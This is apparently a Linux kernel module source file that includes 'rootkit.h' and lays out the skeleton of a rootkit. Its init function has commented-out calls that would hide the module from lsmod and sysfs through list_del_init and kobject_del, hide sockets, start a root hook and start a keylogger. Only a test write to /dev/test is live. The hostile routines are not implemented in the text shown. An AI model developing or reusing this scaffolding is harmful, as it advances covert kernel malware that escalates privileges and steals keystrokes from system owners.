#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/kallsyms.h>
#include "rootkit.h"

MODULE_LICENSE("GPL");


int init_module(void) {
	// remove module from lsmod and /sys/modules 
	
	// list_del_init(&__this_module.list);
 	// kobject_del(&THIS_MODULE->mkobj.kobj);	

	// hide_sock();
	// start_root_hook();
	// start_key_logger();

	struct file *f = driver_file_open("/dev/test", 0, 0);
	driver_file_write(f, 0, "Hello", 5);
	driver_file_close(f);

	return 0;
}


void cleanup_module(void) {
	// remove_sock_hook());
	// stop_root_hook();
	// stop_key_logger();
}
